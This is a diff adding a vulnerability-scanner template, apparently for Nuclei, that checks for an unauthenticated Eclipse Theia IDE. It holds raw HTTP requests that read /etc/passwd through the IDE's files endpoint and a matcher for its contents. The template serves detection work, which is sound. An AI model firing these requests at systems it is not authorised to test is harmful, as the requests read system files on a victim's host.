@@ -1,0 +1,45 @@
+id: theia-lfi-to-rce
+
+info:
+  name: Eclipse Theia IDE - LFI to RCE
+  author: 0x_Akoko
+  severity: critical
+  description: |
+    Detected Eclipse Theia IDE was exposed without authentication, allowing unauthenticated attackers to access the web-based IDE with terminal capabilities, file system access, and arbitrary command execution.
+  reference:
+    - https://theia-ide.org/
+  metadata:
+    verified: true
+    max-request: 2
+  tags: theia,ide,lfi,file-read,unauth,,rce
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /files/?uri=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /files/download/?id={{file_id}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        name: file_id
+        part: body
+        internal: true
+        json:
+          - '.id'
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
+# digest: 490a004630440220369e9c17834a5bde4249d11faf3ff8b5b6a955e927343f0d83f1388f17393c3f0220611da5541d7739826d0387bf91c27dc1674e232a6508b7508381584da67ecb1f:922c64590222798bb761d5b6d8e72950
